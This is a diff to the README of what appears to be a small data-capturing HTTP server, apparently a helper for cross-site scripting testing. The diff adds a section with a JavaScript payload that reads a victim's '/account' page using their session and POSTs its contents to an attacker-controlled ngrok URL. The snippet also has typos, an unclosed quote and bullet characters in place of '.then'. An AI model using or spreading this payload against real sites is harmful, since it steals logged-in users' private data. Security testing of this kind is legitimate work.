@@ -9,6 +9,20 @@ http server capture user data by either sending the data in a query or in the bo
   </script>
 ```
 
+#### Capture protected page or data ####
+```js
+  <script>
+      fetch('/account)
+          • then(p => p.text())
+          • then(t =>
+          fetch('https://NGROK-URL', {
+            method: "POST",
+            headers: { 'Content-Type':'application/json' },
+            body: JSON.stringify({p:t})
+          })
+         ) 
+  </script>
+```
 _____________________________
 
 ### Running the servers
